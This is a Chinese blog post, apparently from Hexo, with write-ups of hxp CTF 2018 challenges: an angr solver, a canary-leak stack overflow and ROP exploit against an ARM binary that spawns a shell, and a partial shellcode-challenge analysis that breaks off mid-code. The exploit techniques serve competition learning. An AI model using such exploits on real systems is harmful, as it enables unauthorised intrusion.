@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HXPCTF2018 - PWN&#x2F;Rev这次CTF做了2个PWN，一个简单REV。算是找回了一些信心。 这次比赛中第一次遇到arm架构的题目，虽然只是栈溢出，但是搭建环境和调试花费了一些时间，并且使用qemu进行调试的步骤也需要记录一下。 解出题目的题解如下： angrme这是个reverse，因为之前用过angr，就顺便写了。 angr的套路不必多说，只要程序打印 :) 就说明输入对了。直接上脚">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【题解】hxpctf2018-pwn">
+<meta property="og:url" content="http://example.com/2018/12/hxpctf2018-pwn/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="HXPCTF2018 - PWN&#x2F;Rev这次CTF做了2个PWN，一个简单REV。算是找回了一些信心。 这次比赛中第一次遇到arm架构的题目，虽然只是栈溢出，但是搭建环境和调试花费了一些时间，并且使用qemu进行调试的步骤也需要记录一下。 解出题目的题解如下： angrme这是个reverse，因为之前用过angr，就顺便写了。 angr的套路不必多说，只要程序打印 :) 就说明输入对了。直接上脚">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="http://example.com/2018/12/hxpctf2018-pwn/1545374656272.png">
+<meta property="og:image" content="http://example.com/2018/12/hxpctf2018-pwn/1545374793589.png">
+<meta property="article:published_time" content="2018-12-30T12:32:06.000Z">
+<meta property="article:modified_time" content="2021-05-24T12:34:37.879Z">
+<meta property="article:author" content="Amjac">
+<meta property="article:tag" content="hxpctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2018/12/hxpctf2018-pwn/1545374656272.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【题解】hxpctf2018-pwn</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2019/08/80x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/12/hxpctf2018-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/12/hxpctf2018-pwn/&text=【题解】hxpctf2018-pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/12/hxpctf2018-pwn/&is_video=false&description=【题解】hxpctf2018-pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【题解】hxpctf2018-pwn&body=Check out this article: http://example.com/2018/12/hxpctf2018-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/12/hxpctf2018-pwn/&name=【题解】hxpctf2018-pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/12/hxpctf2018-pwn/&t=【题解】hxpctf2018-pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HXPCTF2018-PWN-Rev"><span class="toc-number">1.</span> <span class="toc-text">HXPCTF2018 - PWN&#x2F;Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#angrme"><span class="toc-number">1.1.</span> <span class="toc-text">angrme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poor-canary"><span class="toc-number">1.2.</span> <span class="toc-text">poor_canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yunospace"><span class="toc-number">1.3.</span> <span class="toc-text">yunospace</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【题解】hxpctf2018-pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Amjac</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-12-30T12:32:06.000Z" itemprop="datePublished">2018-12-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/hxpctf/" rel="tag">hxpctf</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="HXPCTF2018-PWN-Rev"><a href="#HXPCTF2018-PWN-Rev" class="headerlink" title="HXPCTF2018 - PWN/Rev"></a>HXPCTF2018 - PWN/Rev</h2><p>这次CTF做了2个PWN，一个简单REV。算是找回了一些信心。</p>
+<p>这次比赛中第一次遇到arm架构的题目，虽然只是栈溢出，但是搭建环境和调试花费了一些时间，并且使用qemu进行调试的步骤也需要记录一下。</p>
+<p>解出题目的题解如下：</p>
+<h3 id="angrme"><a href="#angrme" class="headerlink" title="angrme"></a>angrme</h3><p>这是个reverse，因为之前用过angr，就顺便写了。</p>
+<p>angr的套路不必多说，只要程序打印 :) 就说明输入对了。直接上脚本。</p>
+<p>中间出了点小插曲，因为程序中使用了一些特殊的指令<code>movaps  [rsp+1C0h+var_180], xmm0</code> ，直接上angr崩了。google了之后，好像是因为要求RSP 0x10对齐。所以patch了一下程序，在main函数开始的地方 <code>sub rsp, xxx</code>修改成了0x190。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    path = <span class="string">&#x27;./angrme&#x27;</span></span><br><span class="line">    proj = angr.Project(path)</span><br><span class="line"></span><br><span class="line">    proj.arch.initial_sp -= <span class="number">8</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    find_address = <span class="number">0x400000</span> + <span class="number">0x2370</span></span><br><span class="line">    avoid_address = <span class="number">0x400000</span> + <span class="number">0x2390</span></span><br><span class="line">    simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">repr</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    elif simgr.errored:</span></span><br><span class="line"><span class="string">        errored = simgr.errored[0]</span></span><br><span class="line"><span class="string">        print(&quot;Errored: %s&quot; % (errored.error,))</span></span><br><span class="line"><span class="string">        state = errored.state</span></span><br><span class="line"><span class="string">        print(&quot;rip: %s&quot; % (state.regs.rip))</span></span><br><span class="line"><span class="string">        print(&quot;rsp: %s&quot; % (state.regs.rsp))</span></span><br><span class="line"><span class="string">        print(&quot;rbp: %s&quot; % (state.regs.rbp))</span></span><br><span class="line"><span class="string">        proj.factory.block(state.solver.eval(state.regs.rip)).pp()</span></span><br><span class="line"><span class="string">        print(&quot;&quot;)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Couldn\&#x27;t find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="poor-canary"><a href="#poor-canary" class="headerlink" title="poor_canary"></a>poor_canary</h3><p><strong>漏洞分析：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [sp+4h] [bp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [sp+30h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="number">465532</span>); <span class="comment">//由于是arm架构，反汇编有一些异常，但是并不影响阅读</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">465564</span>);</span><br><span class="line">    v4 = read(<span class="number">0</span>, &amp;v7, <span class="number">0x60</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v4 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v8 + v5 - <span class="number">44</span>) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v8 + v5 - <span class="number">44</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显，看到read函数造成栈溢出。利用read函数不添加\x00的特性，泄露出canary，再利用ROPGadget 跳转到system函数即可。</p>
+<p>很神奇，原来ROPGadget对arm架构的ELF也可以使用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lzh@ubuntu:~/workspace/pwn/hxpctf/poor_canary$ ROPgadget --binary canary --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00026b7c : pop &#123;r0, r4, pc&#125;</span><br><span class="line">0x0006f088 : pop &#123;r1, pc&#125;</span><br><span class="line">0x00010160 : pop &#123;r3, pc&#125;</span><br><span class="line">0x00010480 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0005d4dc : pop &#123;r4, pc&#125; ; pop &#123;r4, pc&#125;</span><br><span class="line">0x0001058c : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000111a8 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x00016888 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x00010314 : pop &#123;r4, r5, r7, pc&#125;</span><br><span class="line">0x0001b4dc : pop &#123;r4, r6, r7, pc&#125;</span><br><span class="line">0x000231e8 : pop &#123;r4, r7, pc&#125;</span><br><span class="line">0x0002a454 : pop &#123;r7, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">BIN_PATH = <span class="string">&#x27;./canary&#x27;</span></span><br><span class="line"><span class="comment">#LIBC_PATH = &#x27;libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">	p = process(BIN_PATH)<span class="comment">#, env=&#123;&#x27;LD_PRELOAD&#x27;: LIBC_PATH&#125;)</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">&#x27;116.203.30.62&#x27;</span>, <span class="number">18113</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(BIN_PATH)</span><br><span class="line"><span class="comment">#libc = ELF(LIBC_PATH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00026b7c : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line">system_addr = <span class="number">0x16D90</span></span><br><span class="line">binsh_addr = <span class="number">0x71eb0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">4</span>+<span class="number">1</span>)+<span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>) + p32(canary) + p32(<span class="number">0</span>)*<span class="number">5</span> + p32(canary) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">0x00026b7c</span>) + p32(binsh_addr) + p32(<span class="number">0</span>) + p32(system_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xfffef514 ◂— 0x50111c00</span></span><br><span class="line"><span class="string">06:0018│     0xfffef518 —▸ 0x98548 —▸ 0xfffef69c —▸ 0xfffef7af ◂— 0x5353454c (&#x27;LESS&#x27;)</span></span><br><span class="line"><span class="string">07:001c│     0xfffef51c —▸ 0x10d24 ◂— asrs   sb, sb, #2</span></span><br><span class="line"><span class="string">08:0020│     0xfffef520 —▸ 0x10cbc ◂— push   &#123;r4, r5, r6, r7, r8, sb, sl, lr&#125;</span></span><br><span class="line"><span class="string">09:0024│     0xfffef524 —▸ 0x10158 ◂— push   &#123;r3, lr&#125;</span></span><br><span class="line"><span class="string">0a:0028│     0xfffef528 ◂— 0x0</span></span><br><span class="line"><span class="string">0b:002c│     0xfffef52c ◂— 0x50111c00</span></span><br><span class="line"><span class="string">0c:0030│     0xfffef530 ◂— 0x0</span></span><br><span class="line"><span class="string">0d:0034│     0xfffef534 —▸ 0xfffef558 ◂— 0x2ae90330</span></span><br><span class="line"><span class="string">0e:0038│     0xfffef538 —▸ 0x10158 ◂— push   &#123;r3, lr&#125;</span></span><br><span class="line"><span class="string">0f:003c│     0xfffef53c —▸ 0x10844 ◂— bl     #0x16040</span></span><br><span class="line"><span class="string">10:0040│     0xfffef540 ◂— 0x0</span></span><br><span class="line"><span class="string">11:0044│     0xfffef544 ◂— 0x1</span></span><br><span class="line"><span class="string">12:0048│     0xfffef548 —▸ 0xfffef694 —▸ 0xfffef7a6 ◂— &#x27;./canary&#x27;</span></span><br><span class="line"><span class="string">13:004c│     0xfffef54c —▸ 0x104b8 ◂— push   &#123;r4, r5, lr&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">set architecture arm</span></span><br><span class="line"><span class="string">target remote localhost:10011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b *0x10530</span></span><br><span class="line"><span class="string">b *0x1056C</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建qemu环境的过程单独mark。（使用qemu调试很烦）</p>
+<h3 id="yunospace"><a href="#yunospace" class="headerlink" title="yunospace"></a>yunospace</h3><p>很有意思的一个题，写出来也很有成就感</p>
+<p><strong>漏洞分析：</strong></p>
+<p>有一个外层脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, os, base64</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;hxp&#123;find_the_flag_on_the_server_here&#125;&quot;</span></span><br><span class="line"><span class="meta">... </span>...</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt; Welcome. Which byte should we prepare for you today?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(sys.stdin.readline())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt; I did not get what you mean, sorry.&quot;</span>)</span><br><span class="line">    sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n &gt;= <span class="built_in">len</span>(FLAG):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt; That&#x27;s beyond my capabilities. Goodbye.&quot;</span>)</span><br><span class="line">    sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt; Ok. Now your shellcode, please.&quot;</span>)</span><br><span class="line"></span><br><span class="line">os.execve(<span class="string">&quot;./yunospace&quot;</span>, [<span class="string">&quot;./yunospace&quot;</span>, FLAG[n]], <span class="built_in">dict</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过交互，来执行程序 ./yunospace，并将1Byte的flag作为命令行参数传入程序。</p>
+<p>我们再来看程序是如何使用这1Byte的flag的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *arg1_; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *arg1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *arg1__; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v9; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// r13</span></span><br><span class="line">  FILE *v12; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *rand; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">void</span> *addr; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  rand = <span class="number">0LL</span>;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )                                <span class="comment">// 如果是两个命令行参数</span></span><br><span class="line">  &#123;</span><br><span class="line">    arg1_ = a2[<span class="number">1</span>];</span><br><span class="line">    arg1 = strdup(arg1_);</span><br><span class="line">    v5 = <span class="number">-1LL</span>;</span><br><span class="line">    arg1__ = arg1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      